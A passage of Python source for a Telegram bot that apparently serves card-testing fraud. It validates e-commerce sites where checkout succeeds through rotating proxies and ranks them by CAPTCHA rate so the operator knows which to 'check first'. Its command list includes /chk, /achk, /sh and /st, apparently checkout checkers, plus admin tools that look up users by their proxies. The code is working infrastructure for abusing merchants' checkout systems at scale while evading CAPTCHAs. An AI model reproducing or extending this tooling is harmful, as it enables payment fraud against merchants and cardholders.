            response_info = f"${cheapest_price:.2f} | ✓ Checkout OK | {product_name[:30]}"
            return url, True, "Working", response_info, proxy_url
            
        except Exception as e:
            return domain, False, f"Error: {str(e)[:30]}", None, None
    
    # Validate in parallel
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(validate_single_site, site): site for site in sites}
        
        for idx, future in enumerate(as_completed(futures), 1):
            if cancel_event.is_set():
                break
            
            try:
                url, is_working, status, response_info, proxy_url = future.result()
                
                # Update scraper data
                async with SCRAPER_LOCK:
                    if scraper_key in ACTIVE_SCRAPERS:
                        scraper_data = ACTIVE_SCRAPERS[scraper_key]
                        scraper_data["total_checked"] = idx
                        
                        if is_working:
                            scraper_data["working_sites"][url] = {
                                'response_info': response_info,
                                'proxy': proxy_url
                            }
                        else:
                            scraper_data["failed_sites"].add(url)
                
                # Update progress every 3 seconds
                if time.time() - last_update >= 3:
                    async with SCRAPER_LOCK:
                        if scraper_key in ACTIVE_SCRAPERS:
                            data = ACTIVE_SCRAPERS[scraper_key]
                            working_count = len(data["working_sites"])
                            checked = data["total_checked"]
                            elapsed = time.time() - start_time
                            rate = checked / elapsed if elapsed > 0 else 0
                            eta = (len(sites) - checked) / rate if rate > 0 else 0
                            
                            try:
                                checked_formatted = f"{checked:,}" if checked >= 1000 else str(checked)
                                total_formatted = f"{len(sites):,}" if len(sites) >= 1000 else str(len(sites))
                                working_formatted = f"{working_count:,}" if working_count >= 1000 else str(working_count)
                                failed_count = checked - working_count
                                failed_formatted = f"{failed_count:,}" if failed_count >= 1000 else str(failed_count)
                                
                                # Format ETA nicely
                                eta_minutes = int(eta // 60)
                                eta_seconds = int(eta % 60)
                                eta_hours = int(eta_minutes // 60)
                                eta_mins = eta_minutes % 60
                                
                                if eta_hours > 0:
                                    eta_str = f"{eta_hours}h {eta_mins}m"
                                elif eta_minutes > 0:
                                    eta_str = f"{eta_minutes}m {eta_seconds}s"
                                else:
                                    eta_str = f"{eta_seconds}s"
                                
                                last_working = list(data['working_sites'].keys())[-1] if data['working_sites'] else 'None'
                                if len(last_working) > 50:
                                    last_working = last_working[:47] + "..."
                                
                                await progress_msg.edit_text(
                                    f"🧪 <b>Validating Sites...</b>\n\n"
                                    f"📈 Progress: {checked_formatted}/{total_formatted}\n"
                                    f"✅ Working: {working_formatted}\n"
                                    f"❌ Failed: {failed_formatted}\n"
                                    f"⚡ Speed: {rate:.1f} sites/sec\n"
                                    f"⏱️ ETA: {eta_str}\n\n"
                                    f"🔗 Last working: {last_working}",
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=progress_msg.reply_markup
                                )
                                last_update = time.time()
                            except:
                                pass
            except:
                pass

async def send_scraper_results(user_id, chat_id, progress_msg, scraper_id, cancelled=False):
    """Send scraper results as file"""
    scraper_key = f"{user_id}_{chat_id}"
    
    try:
        async with SCRAPER_LOCK:
            if scraper_key not in ACTIVE_SCRAPERS:
                return
            data = ACTIVE_SCRAPERS[scraper_key]
        
        working_sites = data.get("working_sites", {})
        failed_sites = data.get("failed_sites", set())
        total_checked = data.get("total_checked", 0)
        elapsed = time.time() - data.get("start_time", time.time())
        
        # Create results file
        results_text = f"# Scraper Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        results_text += f"# Total Checked: {total_checked}\n"
        results_text += f"# Working Sites: {len(working_sites)}\n"
        results_text += f"# Failed Sites: {len(failed_sites)}\n"
        results_text += f"# Time Elapsed: {int(elapsed/60)}m {int(elapsed%60)}s\n"
        results_text += f"# Status: {'CANCELLED' if cancelled else 'COMPLETED'}\n"
        results_text += "="*80 + "\n\n"
        
        if working_sites:
            results_text += "# WORKING SITES\n"
            results_text += "="*80 + "\n"
            for url in sorted(working_sites.keys()):
                results_text += f"{url}\n"
            
            results_text += "\n" + "="*80 + "\n\n"
            results_text += "# DETAILED RESPONSE INFO\n"
            results_text += "="*80 + "\n"
            for url in sorted(working_sites.keys()):
                site_data = working_sites[url]
                response_info = site_data.get('response_info', 'Unknown')
                proxy = site_data.get('proxy', 'No proxy')
                
                # Mask proxy
                proxy_display = "No proxy"
                if proxy:
                    try:
                        if '@' in proxy:
                            parts = proxy.split('@')
                            proxy_display = f"***@{parts[1]}"
                        else:
                            parts = proxy.replace('http://', '').split(':')
                            proxy_display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else proxy
                    except:
                        proxy_display = "Proxy"
                
                results_text += f"\n{url}\n"
                results_text += f"  Response: {response_info}\n"
                results_text += f"  Proxy: {proxy_display}\n"
        else:
            results_text += "\nNo working sites found.\n"
        
        # Send file
        file_buffer = io.BytesIO(results_text.encode('utf-8'))
        file_buffer.name = f"scraper_results_{scraper_id}.txt"
        
        status_icon = "⚠️" if cancelled else "✅"
        status_text = "CANCELLED" if cancelled else "COMPLETED"
        
        await progress_msg.edit_text(
            f"{status_icon} <b>Scraper {status_text}</b>\n\n"
            f"Total Checked: {total_checked}\n"
            f"✅ Working: {len(working_sites)}\n"
            f"❌ Failed: {len(failed_sites)}\n"
            f"⏱️ Time: {int(elapsed/60)}m {int(elapsed%60)}s\n"
            f"📊 Success Rate: {(len(working_sites)/total_checked*100) if total_checked > 0 else 0:.1f}%\n\n"
            f"📁 Results file sent below ⬇️",
            parse_mode=ParseMode.HTML,
            reply_markup=None
        )
        
        # Send file
        try:
            await context_from_chat(chat_id).bot.send_document(
                chat_id=chat_id,
                document=file_buffer,
                filename=file_buffer.name,
                caption=f"📊 Scraper Results\n\n✅ {len(working_sites)} working sites\n❌ {len(failed_sites)} failed sites"
            )
        except:
            # Fallback: send as message if file too small
            if len(working_sites) <= 10:
                msg = "📋 <b>Working Sites:</b>\n\n"
                for idx, (url, data) in enumerate(sorted(working_sites.items()), 1):
                    msg += f"{idx}. {url}\n"
                    msg += f"   {data.get('response_info', '')}\n\n"
                await context_from_chat(chat_id).bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        logger.error(f"Error sending scraper results: {e}")
        try:
            await progress_msg.edit_text(
                f"❌ Error sending results: {e}",
                parse_mode=ParseMode.HTML,
                reply_markup=None
            )
        except:
            pass

def context_from_chat(chat_id):
    """Helper to get context from chat_id"""
    class FakeContext:
        def __init__(self, chat_id):
            self.chat_id = chat_id
            from telegram import Bot
            self.bot = Bot(BOT_TOKEN)
    return FakeContext(chat_id)

async def stop_scraper_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback for stopping scraper"""
    try:
        q = update.callback_query
        data = (q.data or "").strip()
        if not data.startswith("STOP_SCR:"):
            await q.answer()
            return
        
        scraper_key = data.split(":", 1)[1]
        await q.answer("Stopping scraper...")
        
        async with SCRAPER_LOCK:
            scraper_data = ACTIVE_SCRAPERS.get(scraper_key)
            if scraper_data:
                scraper_data["event"].set()
        
        try:
            await q.edit_message_reply_markup(reply_markup=None)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error stopping scraper: {e}")
        try:
            await update.effective_chat.send_message("⚠️ Error stopping scraper.")
        except:
            pass

async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show removal logs for sites and proxies + Site Health Tracking"""
    if not await ensure_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    try:
        with REMOVAL_LOGS_LOCK:
            site_logs = REMOVAL_LOGS["sites"].copy()
            proxy_logs = REMOVAL_LOGS["proxies"].copy()
        
        with SITE_HEALTH_LOCK:
            site_health = SITE_HEALTH.copy()
        
        # Sort by timestamp (newest first)
        site_logs.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
        proxy_logs.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
        
        # Create log file content
        log_content = f"# Removal Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        log_content += "=" * 80 + "\n\n"
        
        # Sites section
        log_content += "# REMOVED SITES\n"
        log_content += "=" * 80 + "\n"
        if site_logs:
            # Separate 404 removals from other removals
            removals_404 = [e for e in site_logs if "404" in str(e.get("reason", "")).upper()]
            removals_other = [e for e in site_logs if "404" not in str(e.get("reason", "")).upper()]
            
            # Summary
            log_content += f"\nSUMMARY:\n"
            log_content += f"  Total Removed: {len(site_logs)}\n"
            log_content += f"  ❌ 404 Errors (Dead Sites): {len(removals_404)}\n"
            log_content += f"  ⚠️  Other Reasons: {len(removals_other)}\n"
            log_content += "\n" + "-" * 80 + "\n\n"
            
            # Show 404 removals first (most important)
            if removals_404:
                log_content += "❌ SITES REMOVED DUE TO 404 ERRORS (Dead/Deleted Sites):\n"
                log_content += "-" * 80 + "\n"
                for entry in removals_404:
                    url = entry.get("url", "Unknown")
                    reason = entry.get("reason", "Unknown reason")
                    timestamp = entry.get("timestamp", 0)
                    dt = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S") if timestamp else "Unknown"
                    
                    log_content += f"\n❌ {url}\n"
                    log_content += f"  Reason: {reason}\n"
                    log_content += f"  Removed: {dt}\n"
                log_content += "\n" + "-" * 80 + "\n\n"
            
            # Show other removals
            if removals_other:
                log_content += "⚠️ SITES REMOVED FOR OTHER REASONS:\n"
                log_content += "-" * 80 + "\n"
                for entry in removals_other:
                    url = entry.get("url", "Unknown")
                    reason = entry.get("reason", "Unknown reason")
                    timestamp = entry.get("timestamp", 0)
                    dt = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S") if timestamp else "Unknown"
                    
                    log_content += f"\n⚠️ {url}\n"
                    log_content += f"  Reason: {reason}\n"
                    log_content += f"  Removed: {dt}\n"
        else:
            log_content += "\nNo site removals logged.\n"
        
        log_content += "\n" + "=" * 80 + "\n\n"
        
        # Proxies section
        log_content += "# REMOVED PROXIES\n"
        log_content += "=" * 80 + "\n"
        if proxy_logs:
            for entry in proxy_logs:
                proxy = entry.get("proxy", "Unknown")
                reason = entry.get("reason", "Unknown reason")
                timestamp = entry.get("timestamp", 0)
                dt = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S") if timestamp else "Unknown"
                
                # Mask proxy
                masked_proxy = mask_proxy(proxy)
                
                log_content += f"\n{masked_proxy}\n"
                log_content += f"  Response: {reason}\n"
                log_content += f"  Removed: {dt}\n"
        else:
            log_content += "\nNo proxy removals logged.\n"
        
        log_content += "\n" + "=" * 80 + "\n\n"
        
        # Site Health Tracking section
        log_content += "# SITE HEALTH TRACKING (Smart Analytics)\n"
        log_content += "=" * 80 + "\n\n"
        
        if site_health:
            # Sort sites by health score (best to worst)
            sorted_sites = sorted(site_health.items(), key=lambda x: x[1].get("health_score", 0), reverse=True)
            
            # Summary statistics
            total_sites = len(sorted_sites)
            healthy_sites = sum(1 for _, s in sorted_sites if s.get("health_score", 0) >= 70)
            captcha_sites = sum(1 for _, s in sorted_sites if s.get("health_score", 0) < 30 and s.get("captcha", 0) > s.get("success", 0))
            
            log_content += f"SUMMARY:\n"
            log_content += f"  Total Sites Tracked: {total_sites}\n"
            log_content += f"  Healthy Sites (70%+): {healthy_sites} ({healthy_sites/total_sites*100:.1f}%)\n"
            log_content += f"  CAPTCHA Problem Sites (<30%): {captcha_sites} ({captcha_sites/total_sites*100:.1f}%)\n"
            log_content += "\n" + "-" * 80 + "\n\n"
            
            # Top 50 healthiest sites
            log_content += "TOP 50 HEALTHIEST SITES (Check These First!):\n"
            log_content += "-" * 80 + "\n"
            for url, stats in sorted_sites[:50]:
                score = stats.get("health_score", 0)
                success = stats.get("success", 0)
                captcha = stats.get("captcha", 0)
                error = stats.get("error", 0)
                total = stats.get("total", 0)
                
                # Icon based on health score
                if score >= 80:
                    icon = "✅"
                elif score >= 50:
                    icon = "⚠️"
                else:
                    icon = "❌"
                
                # Last success time
                last_success = stats.get("last_success")
                last_success_str = datetime.fromtimestamp(last_success).strftime("%Y-%m-%d %H:%M") if last_success else "Never"
                
                log_content += f"\n{icon} {url}\n"
                log_content += f"  Health Score: {score:.1f}% | Success: {success}/{total} | CAPTCHA: {captcha} | Error: {error}\n"
                log_content += f"  Last Success: {last_success_str}\n"
            
            log_content += "\n" + "-" * 80 + "\n\n"
            
            # Bottom 30 worst sites (CAPTCHA heavy)
            log_content += "BOTTOM 30 WORST SITES (Avoid These!):\n"
            log_content += "-" * 80 + "\n"
            worst_sites = [s for s in sorted_sites if s[1].get("health_score", 0) < 50][-30:]
            worst_sites.reverse()  # Show worst first
            
            if worst_sites:
                for url, stats in worst_sites:
                    score = stats.get("health_score", 0)
                    success = stats.get("success", 0)
                    captcha = stats.get("captcha", 0)
                    error = stats.get("error", 0)
                    total = stats.get("total", 0)
                    
                    last_captcha = stats.get("last_captcha")
                    last_captcha_str = datetime.fromtimestamp(last_captcha).strftime("%Y-%m-%d %H:%M") if last_captcha else "Never"
                    
                    # Calculate CAPTCHA rate
                    captcha_rate = (captcha / total * 100) if total > 0 else 0
                    
                    log_content += f"\n❌ {url}\n"
                    log_content += f"  Health Score: {score:.1f}% | Success: {success}/{total} | CAPTCHA: {captcha} ({captcha_rate:.1f}%) | Error: {error}\n"
                    log_content += f"  Last CAPTCHA: {last_captcha_str}\n"
            else:
                log_content += "\nNo problematic sites found! All sites are performing well.\n"
            
            log_content += "\n" + "-" * 80 + "\n\n"
            
            
        
        # Create file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
            tmp.write(log_content)
            tmp_path = tmp.name
        
        # Send file
        try:
            with open(tmp_path, 'rb') as f:
                # Count 404 removals
                removals_404_count = sum(1 for e in site_logs if "404" in str(e.get("reason", "")).upper())
                removals_other_count = len(site_logs) - removals_404_count
                
                caption = f"📋 <b>Bot Logs & Analytics</b>\n\n"
                caption += f"🗑️ Sites removed: {len(site_logs)}\n"
                if removals_404_count > 0:
                    caption += f"   ❌ 404 Errors: {removals_404_count}\n"
                if removals_other_count > 0:
                    caption += f"   ⚠️ Other: {removals_other_count}\n"
                caption += f"🔌 Proxies removed: {len(proxy_logs)}\n\n"
                
                # Add site health summary to caption
                if site_health:
                    sorted_sites = sorted(site_health.items(), key=lambda x: x[1].get("health_score", 0), reverse=True)
                    total_sites = len(sorted_sites)
                    healthy_sites = sum(1 for _, s in sorted_sites if s.get("health_score", 0) >= 70)
                    captcha_sites = sum(1 for _, s in sorted_sites if s.get("health_score", 0) < 30 and s.get("captcha", 0) > s.get("success", 0))
                    
                    caption += f"📊 <b>Site Health:</b>\n"
                    caption += f"   Tracked: {total_sites} sites\n"
                    caption += f"   ✅ Healthy: {healthy_sites} ({healthy_sites/total_sites*100:.0f}%)\n"
                    caption += f"   ❌ CAPTCHA: {captcha_sites} ({captcha_sites/total_sites*100:.0f}%)"
                else:
                    caption += f"📊 <b>Site Health:</b> No data yet"
                
                await update.message.reply_document(
                    document=f,
                    filename=f"removal_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
        finally:
            try:
                os.remove(tmp_path)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Error generating logs: {e}")
        await update.message.reply_text(f"❌ Error generating logs: {e}")

async def cmd_logspx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy error logs (429 rate limits, connection failures, etc.)"""
    if not await ensure_access(update, context):
        return
    
    try:
        with PROXY_ERROR_LOGS_LOCK:
            error_logs = PROXY_ERROR_LOGS.copy()
        
        # Sort by timestamp (newest first)
        error_logs.sort(key=lambda x: x.get("timestamp", 0), reverse=True)
        
        # Group by proxy and error type for better analysis
        proxy_stats = {}
        for entry in error_logs:
            proxy = entry.get("proxy", "Unknown")
            error_type = entry.get("error_type", "Unknown")
            masked_proxy = mask_proxy(proxy)
            
            if masked_proxy not in proxy_stats:
                proxy_stats[masked_proxy] = {
                    "proxy": proxy,  # Keep original for masking consistency
                    "errors": {},
                    "total_errors": 0,
                    "last_error": entry.get("timestamp", 0),
                    "first_error": entry.get("timestamp", 0)
                }
            
            stats = proxy_stats[masked_proxy]
            stats["total_errors"] += 1
            stats["last_error"] = max(stats["last_error"], entry.get("timestamp", 0))
            stats["first_error"] = min(stats["first_error"], entry.get("timestamp", 0))
            
            if error_type not in stats["errors"]:
                stats["errors"][error_type] = {
                    "count": 0,
                    "last_occurrence": 0,
                    "messages": []
                }
            
            err_info = stats["errors"][error_type]
            err_info["count"] += 1
            err_info["last_occurrence"] = max(err_info["last_occurrence"], entry.get("timestamp", 0))
            # Keep last 3 unique error messages per type
            error_msg = entry.get("error_msg", "Unknown")[:100]
            if error_msg not in err_info["messages"]:
                err_info["messages"].append(error_msg)
                if len(err_info["messages"]) > 3:
                    err_info["messages"] = err_info["messages"][-3:]
        
        # Create log file content
        log_content = f"# Proxy Error Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        log_content += "=" * 80 + "\n\n"
        log_content += f"Total Errors Logged: {len(error_logs)}\n"
        log_content += f"Unique Proxies: {len(proxy_stats)}\n"
        log_content += "=" * 80 + "\n\n"
        
        # Sort proxies by total errors (worst first)
        sorted_proxies = sorted(proxy_stats.items(), key=lambda x: x[1]["total_errors"], reverse=True)
        
        if sorted_proxies:
            log_content += "# PROXY ERROR SUMMARY (Grouped by Proxy)\n"
            log_content += "=" * 80 + "\n"
            
            for masked_proxy, stats in sorted_proxies:
                log_content += f"\n{masked_proxy}\n"
                log_content += f"  Total Errors: {stats['total_errors']}\n"
                
                first_dt = datetime.fromtimestamp(stats["first_error"]).strftime("%Y-%m-%d %H:%M:%S") if stats["first_error"] else "Unknown"
                last_dt = datetime.fromtimestamp(stats["last_error"]).strftime("%Y-%m-%d %H:%M:%S") if stats["last_error"] else "Unknown"
                log_content += f"  First Error: {first_dt}\n"
                log_content += f"  Last Error: {last_dt}\n"
                log_content += f"  Error Breakdown:\n"
                
                # Sort errors by count
                sorted_errors = sorted(stats["errors"].items(), key=lambda x: x[1]["count"], reverse=True)
                for error_type, err_info in sorted_errors:
                    log_content += f"    - {error_type}: {err_info['count']} times\n"
                    if err_info["messages"]:
                        for msg in err_info["messages"][:2]:  # Show max 2 messages per type
                            log_content += f"      • {msg[:80]}\n"
            
            log_content += "\n" + "=" * 80 + "\n\n"
            log_content += "# DETAILED ERROR LOG (Chronological)\n"
            log_content += "=" * 80 + "\n"
            
            # Show recent errors (last 1000)
            for entry in error_logs[:1000]:
                proxy = entry.get("proxy", "Unknown")
                error_type = entry.get("error_type", "Unknown")
                error_msg = entry.get("error_msg", "Unknown")[:150]
                timestamp = entry.get("timestamp", 0)
                site = entry.get("site", "Unknown")
                dt = datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S") if timestamp else "Unknown"
                
                masked_proxy = mask_proxy(proxy)
                
                log_content += f"\n{masked_proxy}\n"
                log_content += f"  Error Type: {error_type}\n"
                log_content += f"  Response: {error_msg}\n"
                log_content += f"  Site: {site}\n"
                log_content += f"  Time: {dt}\n"
        else:
            log_content += "\nNo proxy errors logged.\n"
        
        # Create file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
            tmp.write(log_content)
            tmp_path = tmp.name
        
        # Send file
        try:
            with open(tmp_path, 'rb') as f:
                caption = f"📊 <b>Proxy Error Logs</b>\n\n"
                caption += f"🔌 Unique proxies: {len(proxy_stats)}\n"
                caption += f"❌ Total errors: {len(error_logs)}\n"
                if sorted_proxies:
                    top_proxy = sorted_proxies[0][0]
                    top_errors = sorted_proxies[0][1]["total_errors"]
                    caption += f"⚠️ Worst proxy: {top_proxy} ({top_errors} errors)"
                
                await update.message.reply_document(
                    document=f,
                    filename=f"proxy_error_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
        finally:
            try:
                os.remove(tmp_path)
            except:
                pass
                
    except Exception as e:
        logger.error(f"Error generating proxy logs: {e}")
        await update.message.reply_text(f"❌ Error generating proxy logs: {e}")

async def cmd_clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Clear all logs (removal logs and proxy error logs)"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    # Admin only
    if not is_admin(user.id):
        await update.message.reply_text("⛔ This command is for admins only.")
        return
    
    try:
        # Clear removal logs (sites and proxies)
        sites_count = 0
        proxies_count = 0
        with REMOVAL_LOGS_LOCK:
            sites_count = len(REMOVAL_LOGS.get("sites", []))
            proxies_count = len(REMOVAL_LOGS.get("proxies", []))
            REMOVAL_LOGS["sites"] = []
            REMOVAL_LOGS["proxies"] = []
        
        # Clear proxy error logs
        error_count = 0
        with PROXY_ERROR_LOGS_LOCK:
            error_count = len(PROXY_ERROR_LOGS)
            PROXY_ERROR_LOGS.clear()
        
        # Send confirmation
        total_cleared = sites_count + proxies_count + error_count
        await update.message.reply_text(
            f"✅ <b>Logs Cleared Successfully</b>\n\n"
            f"🗑️ Sites removals: {sites_count}\n"
            f"🔌 Proxy removals: {proxies_count}\n"
            f"❌ Proxy errors: {error_count}\n\n"
            f"<b>Total: {total_cleared} log entries cleared</b>",
            parse_mode=ParseMode.HTML
        )
        
        logger.info(f"Admin {user.id} cleared all logs: {sites_count} site removals, {proxies_count} proxy removals, {error_count} proxy errors")
        
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        await update.message.reply_text(f"❌ Error clearing logs: {e}")

async def cmd_showpx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Find users by proxy (supports partial match)"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    # Admin only
    if not is_admin(user.id):
        await update.message.reply_text("⛔ This command is for admins only.")
        return
    
    # Get search pattern from arguments
    args = context.args or []
    if not args:
        # Try to get from message text
        full_text = (update.message.text or "").strip()
        if full_text.startswith("/showpx"):
            parts = full_text.split(None, 1)
            if len(parts) > 1:
                args = [parts[1].strip()]
    
    if not args:
        await update.message.reply_text(
            "📝 <b>Usage:</b> /showpx &lt;proxy_part&gt;\n\n"
            "Search for users by proxy (supports partial match).\n\n"
            "<b>Examples:</b>\n"
            "• /showpx ***@brd.superproxy.io:33335\n"
            "• /showpx brd.superproxy.io\n"
            "• /showpx superproxy.io\n"
            "• /showpx 33335",
            parse_mode=ParseMode.HTML
        )
        return
    
    search_pattern = args[0].strip()
    if not search_pattern:
        await update.message.reply_text("❌ Please provide a proxy pattern to search for.")
        return
    
    # Normalize search pattern (remove *** if present, handle @)
    search_pattern_lower = search_pattern.lower()
    if search_pattern_lower.startswith("***@"):
        search_pattern = search_pattern[4:]  # Remove "***@"
    elif search_pattern_lower.startswith("***"):
        search_pattern = search_pattern[3:]  # Remove "***"
    
    try:
        # Read all proxy records
        with PROXIES_LOCK:
            recs = _read_proxy_records()
        
        # Find matching proxies
        matching_users = {}
        for (uid, name, username, proxy, timestamp) in recs:
            # Check if proxy matches the search pattern
            proxy_lower = proxy.lower()
            search_lower = search_pattern.lower()
            
            # Match if search pattern is in proxy
            if search_lower in proxy_lower:
                user_id = int(uid) if uid.isdigit() else None
                if user_id:
                    if user_id not in matching_users:
                        matching_users[user_id] = {
                            "user_id": user_id,
                            "name": name,
                            "username": username,
                            "proxies": [],
                            "first_seen": timestamp
                        }
                    matching_users[user_id]["proxies"].append(proxy)
                    matching_users[user_id]["first_seen"] = min(matching_users[user_id]["first_seen"], timestamp)
        
        if not matching_users:
            await update.message.reply_text(
                f"❌ No users found with proxy matching: <code>{search_pattern}</code>\n\n"
                "Try a different search pattern.",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Build response
        result_lines = []
        result_lines.append(f"🔍 <b>Users Found with Proxy: {search_pattern}</b>\n")
        result_lines.append(f"Total: {len(matching_users)} user(s)\n")
        result_lines.append("=" * 50 + "\n")
        
        # Sort by user_id
        sorted_users = sorted(matching_users.items(), key=lambda x: x[0])
        
        for user_id, user_data in sorted_users:
            name = user_data["name"] or "Unknown"
            username = user_data["username"] or ""
            proxies = user_data["proxies"]
            
            # Create user display
            if username:
                user_display = f"@{username}"
            else:
                user_display = name
            
            result_lines.append(f"\n👤 <b>User:</b> {user_display}")
            result_lines.append(f"   ID: <code>{user_id}</code>")
            result_lines.append(f"   Proxies ({len(proxies)}):")
            
            # Show proxies (masked)
            for proxy in proxies[:5]:  # Limit to 5 proxies per user
                masked_proxy = mask_proxy(proxy)
                result_lines.append(f"   • <code>{masked_proxy}</code>")
            
            if len(proxies) > 5:
                result_lines.append(f"   ... and {len(proxies) - 5} more")
        
        # Send response
        response_text = "\n".join(result_lines)
        
        # Split if too long (Telegram has 4096 char limit)
        if len(response_text) > 4000:
            # Send first part
            await update.message.reply_text(
                response_text[:4000] + "\n\n... (truncated)",
                parse_mode=ParseMode.HTML
            )
            
            # Send remaining as file if there are many results
            file_content = f"# Users with Proxy: {search_pattern}\n"
            file_content += f"# Total Users: {len(matching_users)}\n"
            file_content += "=" * 80 + "\n\n"
            
            for user_id, user_data in sorted_users:
                name = user_data["name"] or "Unknown"
                username = user_data["username"] or ""
                proxies = user_data["proxies"]
                
                user_display = f"@{username}" if username else name
                
                file_content += f"\nUser: {user_display}\n"
                file_content += f"ID: {user_id}\n"
                file_content += f"Proxies ({len(proxies)}):\n"
                
                for proxy in proxies:
                    masked_proxy = mask_proxy(proxy)
                    file_content += f"  - {masked_proxy}\n"
            
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
                tmp.write(file_content)
                tmp_path = tmp.name
            
            try:
                with open(tmp_path, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=f"proxy_search_{search_pattern[:20]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                        caption=f"📋 Full results for proxy: {search_pattern}"
                    )
            finally:
                try:
                    os.remove(tmp_path)
                except:
                    pass
        else:
            await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        logger.error(f"Error in cmd_showpx: {e}")
        await update.message.reply_text(f"❌ Error searching proxies: {e}")

def main():
    ensure_uploads_dir()

    try:
        checkout.SUMMARY_ONLY = True
    except Exception:
        pass

    app = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).post_init(_post_init).build()

    # Initialize the /txt load balancer router with the actual cmd_txt function
    cmd_txt_router.init_txt_router(cmd_txt)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    # Handler for /achk amount input (text messages that are not commands)
    # Only process if user has pending ACHK results - check is done inside handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_achk_amount), group=1)
    # Use load-balanced version of /txt command
    app.add_handler(CommandHandler("txt", cmd_txt_router.cmd_txt_with_load_balancing))
    # Add command to view load balancer stats (admin only)
    app.add_handler(CommandHandler("txtstats", cmd_txt_router.cmd_txt_stats))
    app.add_handler(CommandHandler("setpr", cmd_setpr))
    app.add_handler(CommandHandler("allowuser", cmd_allowuser))
    app.add_handler(CommandHandler("rmuser", cmd_rmuser))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("sh", cmd_sh))
    app.add_handler(CommandHandler("st", cmd_st))
    app.add_handler(CommandHandler("sc", cmd_sc))
    
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("resetstats", cmd_resetstats))
    app.add_handler(CommandHandler("show", cmd_show))
    app.add_handler(CommandHandler("showpx", cmd_showpx))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("rmpr", cmd_rmpr))
    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
    app.add_handler(CommandHandler("cleanproxies", cmd_cleanproxies))
    app.add_handler(CommandHandler("chkpr", cmd_chkpr))
    app.add_handler(CommandHandler("scr", cmd_scr))
    
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("broadcastuser", cmd_broadcastuser))
    app.add_handler(CommandHandler("broadcastactive", cmd_broadcastactive))
    
    app.add_handler(CommandHandler("restrict", cmd_restrict))
    app.add_handler(CommandHandler("allowonly", cmd_allowonly))
    app.add_handler(CommandHandler("unrestrict", cmd_unrestrict))
    
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("admins", cmd_admins))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("rmadmin", cmd_rmadmin))
    app.add_handler(CommandHandler("giveperm", cmd_giveperm))
    app.add_handler(CommandHandler("retrieve", cmd_retrieve))
    
    app.add_handler(CommandHandler("addgp", cmd_addgp))
    app.add_handler(CommandHandler("showgp", cmd_showgp))
    app.add_handler(CommandHandler("onlygp", cmd_onlygp))
    app.add_handler(CommandHandler("allowall", cmd_allowall))
    app.add_handler(CommandHandler("delgp", cmd_delgp))
    app.add_handler(CommandHandler("allowuser", cmd_allowuser))
    app.add_handler(CommandHandler("rmuser", cmd_rmuser))
    app.add_handler(CommandHandler("users", cmd_users))
    
    app.add_handler(CommandHandler("addsite", cmd_addsite))
    app.add_handler(CommandHandler("rmsite", cmd_rmsite))
    app.add_handler(CommandHandler("flsite", cmd_flsite))
    app.add_handler(CommandHandler("site", cmd_site))
    app.add_handler(CommandHandler("chksite", cmd_chksite))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("achk", cmd_achk))
    app.add_handler(CommandHandler("verify", cmd_verify))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("logspx", cmd_logspx))
    app.add_handler(CommandHandler("clearlogs", cmd_clearlogs))
    
    app.add_handler(CommandHandler("reboot", cmd_reboot))
    app.add_handler(CommandHandler("resetactive", cmd_resetactive))
    app.add_handler(CommandHandler("stopall", cmd_stopall))
    
